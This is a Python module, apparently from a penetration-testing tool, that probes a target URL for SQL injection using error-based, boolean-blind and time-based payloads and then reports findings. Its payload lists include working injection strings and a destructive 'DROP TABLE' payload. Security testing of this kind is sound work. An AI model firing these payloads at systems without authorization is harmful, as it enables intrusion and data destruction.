import requests
import re
import time
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse


class SQLiAttack:
    """SQL Injection testing — error-based, boolean blind, and time-based blind."""

    NAME = "sqli"
    DESCRIPTION = "SQL Injection Testing"

    # Common SQL error patterns by database engine
    SQL_ERROR_PATTERNS = [
        # MySQL
        (r"You have an error in your SQL syntax", "MySQL"),
        (r"Warning.*mysql_", "MySQL"),
        (r"MySQLSyntaxErrorException", "MySQL"),
        (r"valid MySQL result", "MySQL"),
        (r"check the manual that corresponds to your MySQL", "MySQL"),
        # PostgreSQL
        (r"ERROR:\s+syntax error at or near", "PostgreSQL"),
        (r"pg_query\(\).*failed", "PostgreSQL"),
        (r"PSQLException", "PostgreSQL"),
        # SQLite
        (r"SQLite3::query", "SQLite"),
        (r"SQLITE_ERROR", "SQLite"),
        (r"sqlite3\.OperationalError", "SQLite"),
        (r"unrecognized token", "SQLite"),
        # MSSQL
        (r"Unclosed quotation mark", "MSSQL"),
        (r"Microsoft OLE DB Provider for SQL Server", "MSSQL"),
        (r"ODBC SQL Server Driver", "MSSQL"),
        (r"SqlException", "MSSQL"),
        # Oracle
        (r"ORA-\d{5}", "Oracle"),
        (r"Oracle.*Driver", "Oracle"),
        (r"quoted string not properly terminated", "Oracle"),
        # Generic
        (r"SQL syntax.*error", "Unknown"),
        (r"syntax error.*SQL", "Unknown"),
        (r"Unclosed.*quote", "Unknown"),
        (r"unterminated.*string", "Unknown"),
        (r"SQLSTATE\[", "Unknown"),
    ]

    ERROR_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "\" OR \"1\"=\"1",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1; DROP TABLE test--",
        "' AND 1=CONVERT(int, @@version)--",
        "') OR ('1'='1",
    ]

    BLIND_TRUE_PAYLOADS = [
        "' AND '1'='1",
        "' AND 1=1--",
        "\" AND \"1\"=\"1",
        "1 AND 1=1",
    ]

    BLIND_FALSE_PAYLOADS = [
        "' AND '1'='2",
        "' AND 1=2--",
        "\" AND \"1\"=\"2",
        "1 AND 1=2",
    ]

    TIME_PAYLOADS = [
        ("' AND SLEEP({delay})--", "MySQL"),
        ("'; WAITFOR DELAY '0:0:{delay}'--", "MSSQL"),
        ("' AND pg_sleep({delay})--", "PostgreSQL"),
        ("' AND randomblob({delay}00000000)--", "SQLite"),
    ]

    def __init__(self, base_url: str, domain: str, session: requests.Session = None):
        self.base_url = base_url
        self.domain = domain
        self.session = session or requests.Session()
        self.session.headers.update({"User-Agent": "SkillGuard-PenTest/1.0"})
        self.findings = []

    def _get_injection_points(self, context: dict = None) -> list[dict]:
        """Gather all injectable parameters from URL query params and discovered forms."""
        points = []
        parsed = urlparse(self.base_url)
        params = parse_qs(parsed.query)
        for param_name in params:
            points.append({
                "type": "query_param",
                "name": param_name,
                "method": "GET",
            })

        if context and "forms" in context:
            for form in context["forms"]:
                for field in form.get("fields", []):
                    points.append({
                        "type": "form_field",
                        "name": field,
                        "method": "GET",
                    })

        # Fallback candidate parameters if no existing query params or forms found
        if not points:
            COMMON_SQLI_PARAMS = ["id", "user", "username", "page", "item", "category", "search", "q", "query"]
            for param in COMMON_SQLI_PARAMS:
                points.append({
                    "type": "probed_param",
                    "name": param,
                    "method": "GET",
                })

        return points

    def _test_error_based(self, param_name: str, method: str) -> list[dict]:
        """Inject payloads and look for SQL error strings in response."""
        findings = []
        for payload in self.ERROR_PAYLOADS:
            try:
                if method == "GET":
                    resp = self.session.get(
                        self.base_url, params={param_name: payload}, timeout=10
                    )
                else:
                    resp = self.session.post(
                        self.base_url, data={param_name: payload}, timeout=10
                    )

                for pattern, db_type in self.SQL_ERROR_PATTERNS:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        findings.append({
                            "rule": "SQLI_ERROR",
                            "description": (
                                f"Error-based SQL injection via '{param_name}' — "
                                f"{db_type} error triggered by payload: {payload}"
                            ),
                            "severity": "HIGH",
                            "parameter": param_name,
                            "payload": payload,
                            "db_type": db_type,
                            "technique": "error-based",
                        })
                        return findings  # One confirmed finding per param is enough
            except requests.RequestException:
                continue
        return findings

    def _test_blind_boolean(self, param_name: str, method: str) -> list[dict]:
        """Compare response lengths for true vs false conditions."""
        findings = []
        for true_payload, false_payload in zip(
            self.BLIND_TRUE_PAYLOADS, self.BLIND_FALSE_PAYLOADS
        ):
            try:
                if method == "GET":
                    true_resp = self.session.get(
                        self.base_url, params={param_name: true_payload}, timeout=10
                    )
                    false_resp = self.session.get(
                        self.base_url, params={param_name: false_payload}, timeout=10
                    )
                else:
                    true_resp = self.session.post(
                        self.base_url, data={param_name: true_payload}, timeout=10
                    )
                    false_resp = self.session.post(
                        self.base_url, data={param_name: false_payload}, timeout=10
                    )

                true_len = len(true_resp.text)
                false_len = len(false_resp.text)
                diff = abs(true_len - false_len)

                # Significant difference suggests boolean-based blind SQLi
                if true_len != false_len and diff > 50:
                    findings.append({
                        "rule": "SQLI_BLIND_BOOLEAN",
                        "description": (
                            f"Possible boolean-based blind SQL injection via '{param_name}' — "
                            f"response length differs by {diff} bytes between true/false conditions"
                        ),
                        "severity": "HIGH",
                        "parameter": param_name,
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "response_diff_bytes": diff,
                        "technique": "blind-boolean",
                    })
                    return findings
            except requests.RequestException:
                continue
        return findings

    def _test_time_based(self, param_name: str, method: str, delay: int = 3) -> list[dict]:
        """Inject time-delay payloads and measure response time."""
        findings = []

        # Establish baseline response time
        try:
            start = time.time()
            if method == "GET":
                self.session.get(
                    self.base_url, params={param_name: "1"}, timeout=15
                )
            else:
                self.session.post(
                    self.base_url, data={param_name: "1"}, timeout=15
                )
            baseline = time.time() - start
        except requests.RequestException:
            return findings

        for payload_template, db_type in self.TIME_PAYLOADS:
            payload = payload_template.format(delay=delay)
            try:
                start = time.time()
                if method == "GET":
                    self.session.get(
                        self.base_url, params={param_name: payload}, timeout=delay + 12
                    )
                else:
                    self.session.post(
                        self.base_url, data={param_name: payload}, timeout=delay + 12
                    )
                elapsed = time.time() - start

                # Response took significantly longer than baseline
                if elapsed >= baseline + delay - 0.5:
                    findings.append({
                        "rule": "SQLI_BLIND_TIME",
                        "description": (
                            f"Time-based blind SQL injection via '{param_name}' — "
                            f"{db_type} SLEEP triggered ({elapsed:.1f}s vs {baseline:.1f}s baseline)"
                        ),
                        "severity": "HIGH",
                        "parameter": param_name,
                        "payload": payload,
                        "db_type": db_type,
                        "technique": "time-based-blind",
                        "response_time": round(elapsed, 2),
                        "baseline_time": round(baseline, 2),
                    })
                    return findings
            except requests.Timeout:
                # Timeout could indicate successful time-based injection
                findings.append({
                    "rule": "SQLI_BLIND_TIME",
                    "description": (
                        f"Possible time-based blind SQL injection via '{param_name}' — "
                        f"{db_type} payload caused request timeout"
                    ),
                    "severity": "MEDIUM",
                    "parameter": param_name,
                    "payload": payload,
                    "db_type": db_type,
                    "technique": "time-based-blind",
                })
                return findings
            except requests.RequestException:
                continue
        return findings

    def run(self, context: dict = None) -> list[dict]:
        """Run all SQL injection tests against discovered injection points."""
        self.findings = []
        injection_points = self._get_injection_points(context)

        if not injection_points:
            self.findings.append({
                "rule": "SQLI_SKIPPED",
                "description": "No injectable parameters or form fields discovered — SQL injection testing skipped",
                "severity": "INFO",
            })
            return self.findings

        for point in injection_points:
            name = point["name"]
            method = point["method"]

            # Error-based first (most reliable signal)
            error_findings = self._test_error_based(name, method)
            self.findings.extend(error_findings)

            # Blind boolean
            blind_findings = self._test_blind_boolean(name, method)
            self.findings.extend(blind_findings)

            # Time-based blind (slowest, run last)
            time_findings = self._test_time_based(name, method)
            self.findings.extend(time_findings)

        return self.findings
